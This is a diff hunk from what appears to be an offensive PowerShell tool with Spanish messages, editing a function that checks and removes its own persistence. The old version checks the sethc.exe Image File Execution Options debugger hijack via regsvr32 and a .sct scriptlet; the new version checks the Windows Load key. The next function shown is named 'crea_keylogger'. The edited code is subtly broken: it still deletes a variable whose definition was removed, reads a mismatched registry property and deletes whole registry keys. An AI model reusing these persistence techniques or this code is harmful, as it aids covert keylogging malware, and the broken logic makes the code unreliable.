@@ -230,12 +230,11 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
-$key2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check2 = Get-ItemProperty $key2 -name Debugger | Select-String "regsvr32.exe"
-if ($check.count -eq 0 -and $check2.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
+$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load" ;$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
+if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
 remove-item $key ; remove-item $key2
-Remove-Item C:\Windows\System32\log2.sct; return $texto; break
+Remove-Item C:\Users\Public\Libraries\log2.sct; return $texto; break
 }}}
 
 function crea_keylogger { param ($extrae)
